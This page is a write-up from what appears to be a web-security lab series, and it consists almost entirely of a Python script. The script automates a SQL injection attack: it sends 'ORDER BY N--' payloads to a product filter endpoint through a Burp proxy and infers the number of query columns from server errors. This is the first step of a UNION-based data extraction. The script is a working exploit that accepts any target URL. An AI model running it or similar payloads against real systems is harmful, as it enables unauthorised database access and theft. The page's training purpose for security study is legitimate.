---
description: >-
  SQL injection UNION attack, determining the number of columns returned by the
  query.
---

# 3 - Determine Number of Columns

```python
import urllib3
import requests
import sys


# Disable 'Insecure Request' warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp proxy
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def exploit_sqli_column_number(url):
    """Exploit SQL injection to determine number of columns"""
    path = "/filter?category=Gifts"

    for i in range(1, 50):
        sql_payload = "'+ORDER+BY+%s--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text

        if "Internal Server Error" in res:
            return i - 1

        i = i + 1
    
    return False


if __name__ == "__main__":
    try:
        # Get url argument
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])

        sys.exit(-1)

    print("[+] Figuring out number of columns...")

    num_columns = exploit_sqli_column_number(url)

    if num_columns:
        print("[+] The number of columns is " + str(num_columns) + ".")
    else:
        print("[-] The SQLi attack was not successful.")
```
